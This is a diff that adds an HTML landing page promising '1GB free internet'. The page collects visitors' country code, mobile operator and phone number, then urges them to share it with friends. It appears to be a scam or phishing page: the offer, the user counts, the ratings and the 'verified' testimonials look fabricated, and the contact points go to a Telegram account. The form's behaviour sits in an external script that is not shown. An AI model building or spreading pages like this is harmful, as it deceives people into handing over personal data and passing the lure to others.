@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<base href="https://sf-freenet.vercel.app/?id=6199646296" /><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Free Internet Data Hub</title>
+	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet" />
+	<style type="text/css">* {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        :root {
+            --primary: #10b981;
+            --primary-dark: #059669;
+            --secondary: #0ea5e9;
+            --text: #1f2937;
+            --light-bg: #f0fdf4;
+            --success: #22c55e;
+            --warning: #f59e0b;
+        }
+
+        body {
+            background: var(--light-bg);
+            color: var(--text);
+        }
+
+        /* Header Styles */
+        header {
+            background: #fff;
+            padding: 16px 24px;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .nav-links a {
+            color: var(--text);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        /* Hero Section */
+        .hero {
+            margin-top: 64px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            padding: 100px 24px;
+            text-align: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('/api/placeholder/1200/600') center/cover;
+            opacity: 0.1;
+        }
+
+        .hero-content {
+            max-width: 800px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 24px;
+            font-weight: 800;
+        }
+
+        .hero p {
+            font-size: 20px;
+            margin-bottom: 32px;
+            opacity: 0.9;
+        }
+
+        /* Features Section */
+        .features {
+            padding: 80px 24px;
+            background: white;
+        }
+
+        .features-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .features h2 {
+            text-align: center;
+            font-size: 36px;
+            margin-bottom: 48px;
+            color: var(--text);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 32px;
+            margin-bottom: 48px;
+        }
+
+        .feature-card {
+            padding: 24px;
+            border-radius: 16px;
+            background: var(--light-bg);
+            text-align: center;
+            transition: transform 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .feature-icon {
+            font-size: 32px;
+            color: var(--primary);
+            margin-bottom: 16px;
+        }
+
+        /* Form Section */
+        .form-section {
+            background: white;
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+        }
+
+        .form-section h2 {
+            text-align: center;
+            margin-bottom: 32px;
+            font-size: 32px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text);
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.1);
+            outline: none;
+        }
+
+        /* Statistics Section */
+        .statistics {
+            padding: 60px 24px;
+            background: var(--light-bg);
+        }
+
+        .stats-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 32px;
+            text-align: center;
+        }
+
+        .stat-item {
+            padding: 24px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        .stat-number {
+            font-size: 36px;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+
+        /* How It Works Section */
+        .how-it-works {
+            padding: 80px 24px;
+            background: white;
+        }
+
+        .steps-container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 32px;
+            margin-bottom: 48px;
+            padding: 24px;
+            border-radius: 16px;
+            background: var(--light-bg);
+        }
+
+        .step-number {
+            width: 48px;
+            height: 48px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        /* Testimonials Section */
+        .testimonials {
+            padding: 80px 24px;
+            background: var(--light-bg);
+        }
+
+        .testimonials-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .testimonial-card {
+            background: white;
+            padding: 32px;
+            border-radius: 16px;
+            margin-bottom: 32px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        .testimonial-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+
+        .testimonial-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: var(--primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+
+        /* Buttons */
+        .button {
+            display: inline-block;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s;
+            cursor: pointer;
+            border: none;
+            text-align: center;
+        }
+
+        .button-primary {
+            background: var(--primary);
+            color: white;
+        }
+
+        .button-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+
+        .button-secondary {
+            background: white;
+            color: var(--primary);
+            border: 2px solid var(--primary);
+        }
+
+        .button-secondary:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        /* Footer */
+        footer {
+            background: white;
+            padding: 48px 24px;
+            margin-top: 80px;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 48px;
+        }
+
+        .footer-section h3 {
+            color: var(--text);
+            margin-bottom: 24px;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: var(--text);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+
+        .social-links {
+            display: flex;
+            gap: 16px;
+            margin-top: 16px;
+        }
+
+        .social-links a {
+            color: var(--primary);
+            font-size: 24px;
+            transition: color 0.3s;
+        }
+
+        .social-links a:hover {
+            color: var(--primary-dark);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 36px;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .step {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .footer-container {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+
+            .social-links {
+                justify-content: center;
+            }
+        }
+	</style>
+</head>
+<body>
+<header>
+<div class="header-container">
+<div class="logo">Free Internet</div>
+
+<nav class="nav-links"><a href="#features">Features</a> <a href="#how-it-works">How It Works</a> <a href="#testimonials">Testimonials</a> <a href="#contact">Contact</a></nav>
+</div>
+</header>
+
+<section class="hero">
+<div class="hero-content">
+<h1>Get 1GB Free Internet Today!</h1>
+
+<p>Join millions of satisfied users who&#39;ve already claimed their free data. Limited time offer!</p>
+<a class="button button-primary" href="#claim">Claim Your Free Data</a></div>
+</section>
+
+<section class="form-section" id="claim">
+<h2>Claim Your Free 1GB Now</h2>
+
+<form action="" id="data-form"><input name="__original_url" type="hidden" value="https://sf-freenet.vercel.app/?id=6199646296" />
+<div class="form-group"><label for="country">Country Code</label> <select id="country" required=""><option>Select Country 🌎</option><option value="+213">🇩🇿 +213 (Algeria)</option><option value="+91">🇮🇳 +91 (India)</option><option value="+1">🇺🇸 +1 (USA)</option><option value="+880">🇧🇩 +880 (Bangladesh)</option><option value="+44">🇬🇧 +44 (UK)</option><option value="+61">🇦🇺 +61 (Australia)</option><option value="+49">🇩🇪 +49 (Germany)</option><option value="+33">🇫🇷 +33 (France)</option><option value="+39">🇮🇹 +39 (Italy)</option><option value="+34">🇪🇸 +34 (Spain)</option><option value="+81">🇯🇵 +81 (Japan)</option><option value="+55">🇧🇷 +55 (Brazil)</option><option value="+7">🇷🇺 +7 (Russia)</option><option value="+86">🇨🇳 +86 (China)</option><option value="+27">🇿🇦 +27 (South Africa)</option><option value="+52">🇲🇽 +52 (Mexico)</option><option value="+82">🇰🇷 +82 (South Korea)</option><option value="+20">🇪🇬 +20 (Egypt)</option><option value="+31">🇳🇱 +31 (Netherlands)</option><option value="+46">🇸🇪 +46 (Sweden)</option><option value="+55">🇧🇷 +55 (Brazil)</option><option value="+56">🇨🇱 +56 (Chile)</option><option value="+41">🇨🇭 +41 (Switzerland)</option><option value="+65">🇸🇬 +65 (Singapore)</option><option value="+60">🇲🇾 +60 (Malaysia)</option><option value="+971">🇦🇪 +971 (UAE)</option><option value="+63">🇵🇭 +63 (Philippines)</option><option value="+92">🇵🇰 +92 (Pakistan)</option><option value="+92">🇳🇬 +234 (Nigeria)</option> </select></div>
+
+<div class="form-group"><label for="operator">SIM Provider</label> <select id="operator" required=""><option value="">Select Operator📱</option><option value="Mobilis">Mobilis (Algeria)</option><option value="Djezzy">Djezzy (Algeria)</option><option value="Ooredoo">Ooredoo (Algeria)</option><option value="Airtel">Airtel (India)</option><option value="Jio">Jio (India)</option><option value="Vi">Vi (India)</option><option value="BSNL">BSNL (India)</option><option value="T-Mobile">T-Mobile (USA)</option><option value="Verizon">Verizon (USA)</option><option value="AT&amp;T">AT&amp;T (USA)</option><option value="Sprint">Sprint (USA)</option><option value="EE">EE (UK)</option><option value="Vodafone">Vodafone (UK)</option><option value="O2">O2 (UK)</option><option value="Three">Three (UK)</option><option value="Telstra">Telstra (Australia)</option><option value="Optus">Optus (Australia)</option><option value="Vodafone">Vodafone (Australia)</option><option value="Jazz">Jazz (Pakistan)</option><option value="Telenor">Telenor (Pakistan)</option><option value="Zong">Zong (Pakistan)</option><option value="Ufone">Ufone (Pakistan)</option><option value="Grameenphone">Grameenphone (Bangladesh)</option><option value="Robi">Robi (Bangladesh)</option><option value="Banglalink">Banglalink (Bangladesh)</option><option value="Teletalk">Teletalk (Bangladesh)</option><option value="MTS">MTS (Russia)</option><option value="Beeline">Beeline (Russia)</option><option value="MegaFon">MegaFon (Russia)</option><option value="China Mobile">China Mobile (China)</option><option value="China Telecom">China Telecom (China)</option><option value="China Unicom">China Unicom (China)</option><option value="Deutsche Telekom">Deutsche Telekom (Germany)</option><option value="Vodafone">Vodafone (Germany)</option><option value="O2">O2 (Germany)</option><option value="Orange">Orange (France)</option><option value="SFR">SFR (France)</option><option value="Bouygues">Bouygues (France)</option><option value="Claro">Claro (Brazil)</option><option value="Vivo">Vivo (Brazil)</option><option value="TIM">TIM (Brazil)</option><option value="SK Telecom">SK Telecom (South Korea)</option><option value="KT">KT (South Korea)</option><option value="LG Uplus">LG Uplus (South Korea)</option><option value="Etisalat">Etisalat (UAE)</option><option value="du">du (UAE)</option><option value="Singtel">Singtel (Singapore)</option><option value="StarHub">StarHub (Singapore)</option><option value="M1">M1 (Singapore)</option><option value="O2">O2 (Germany)</option><option value="Telia">Telia (Sweden)</option><option value="MTN">MTN (Nigeria)</option><option value="Airtel">Airtel (Nigeria)</option><option value="9mobile">9mobile (Nigeria)</option><option value="Glo">Glo (Nigeria)</option> </select></div>
+
+<div class="form-group"><label for="mobile-number">Phone Number</label> <input id="mobile-number" placeholder="Enter your phone number" required="" type="text" /></div>
+<button class="button button-primary" type="submit">Get Your Free 1GB Now</button></form>
+</section>
+
+<section class="success-section" id="success-section" style="display: none;">
+<div class="testimonial-card">
+<h3>🎉 Congratulations!</h3>
+
+<p>Your 1GB free internet is being processed. Share with friends to get additional data!</p>
+<button class="button button-primary" style="margin-top: 20px;">Share &amp; Get More</button></div>
+</section>
+
+<section class="features" id="features">
+<div class="features-container">
+<h2>Why Choose Us</h2>
+
+<div class="features-grid">
+<div class="feature-card">
+<div class="feature-icon">&nbsp;</div>
+
+<h3>Instant Activation</h3>
+
+<p>Get your free data instantly after verification</p>
+</div>
+
+<div class="feature-card">
+<div class="feature-icon">&nbsp;</div>
+
+<h3>Worldwide Coverage</h3>
+
+<p>Available in over 150+ countries</p>
+</div>
+
+<div class="feature-card">
+<div class="feature-icon">&nbsp;</div>
+
+<h3>Secure Process</h3>
+
+<p>100% safe and secure verification</p>
+</div>
+
+<div class="feature-card">
+<div class="feature-icon">&nbsp;</div>
+
+<h3>24/7 Support</h3>
+
+<p>Round-the-clock customer support</p>
+</div>
+</div>
+</div>
+</section>
+
+<section class="statistics">
+<div class="stats-container">
+<div class="stat-item">
+<div class="stat-number">1M+</div>
+
+<div class="stat-label">Happy Users</div>
+</div>
+
+<div class="stat-item">
+<div class="stat-number">150+</div>
+
+<div class="stat-label">Countries</div>
+</div>
+
+<div class="stat-item">
+<div class="stat-number">50+</div>
+
+<div class="stat-label">Network Providers</div>
+</div>
+
+<div class="stat-item">
+<div class="stat-number">4.8⭐</div>
+
+<div class="stat-label">User Rating</div>
+</div>
+</div>
+</section>
+
+<section class="how-it-works" id="how-it-works">
+<div class="steps-container">
+<h2 style="text-align: center; margin-bottom: 48px;">How It Works</h2>
+
+<div class="step">
+<div class="step-number">1</div>
+
+<div class="step-content">
+<h3>Select Your Country</h3>
+
+<p>Choose your country from our supported regions list</p>
+</div>
+</div>
+
+<div class="step">
+<div class="step-number">2</div>
+
+<div class="step-content">
+<h3>Enter Your Details</h3>
+
+<p>Provide your mobile number and select your network provider</p>
+</div>
+</div>
+
+<div class="step">
+<div class="step-number">3</div>
+
+<div class="step-content">
+<h3>Verify Your Number</h3>
+
+<p>Complete the quick verification process</p>
+</div>
+</div>
+
+<div class="step">
+<div class="step-number">4</div>
+
+<div class="step-content">
+<h3>Get Your Data</h3>
+
+<p>Receive your free 1GB data instantly after verification</p>
+</div>
+</div>
+</div>
+</section>
+
+<section class="testimonials" id="testimonials">
+<div class="testimonials-container">
+<h2 style="text-align: center; margin-bottom: 48px;">What Our Users Say</h2>
+
+<div class="testimonial-card">
+<div class="testimonial-header">
+<div class="testimonial-avatar">&nbsp;</div>
+
+<div>
+<h4>Anjali Gupta</h4>
+
+<p style="color: var(--primary);">Verified User</p>
+</div>
+</div>
+
+<p>&quot;Amazing service! Got my free data instantly. Perfect for emergency situations!&quot;</p>
+</div>
+
+<div class="testimonial-card">
+<div class="testimonial-header">
+<div class="testimonial-avatar">&nbsp;</div>
+
+<div>
+<h4>Gaurav Kumar</h4>
+
+<p style="color: var(--primary);">Verified User</p>
+</div>
+</div>
+
+<p>&quot;Simple process and quick activation. Highly recommended!&quot;</p>
+</div>
+</div>
+</section>
+
+<footer>
+<div class="footer-container">
+<div class="footer-section">
+<h3>Quick Links</h3>
+
+<ul class="footer-links">
+	<li><a href="#features">Features</a></li>
+	<li><a href="#how-it-works">How It Works</a></li>
+	<li><a href="#testimonials">Testimonials</a></li>
+	<li><a href="#claim">Get Started</a></li>
+</ul>
+</div>
+
+<div class="footer-section">
+<h3>Support</h3>
+
+<ul class="footer-links">
+	<li><a href="https://t.me/SG_Modder" target="_blank">FAQ</a></li>
+	<li><a href="https://t.me/SG_Modder" target="_blank">Contact Us</a></li>
+	<li><a href="private.html">Privacy Policy</a></li>
+	<li><a href="term.html">Terms of Service</a></li>
+</ul>
+</div>
+
+<div class="footer-section">
+<h3>Connect With Us</h3>
+
+<p>Join our community for updates and offers</p>
+
+<div class="social-links">&nbsp;</div>
+</div>
+
+<div class="footer-section">
+<h3>Newsletter</h3>
+
+<p>Subscribe for latest updates and offers</p>
+
+<div class="form-group"><input placeholder="Enter your email" style="margin-top: 10px;" type="email" /><button class="button button-primary" style="margin-top: 10px;">Subscribe</button></div>
+</div>
+</div>
+
+<div style="text-align: center; margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee;">
+<p>&copy; 2024 Free Internet Data Hub. All Rights Reserved.</p>
+</div>
+</footer>
+<script src="script.js"></script>
+
+<p>&nbsp;</p>
+</body>
+</html>
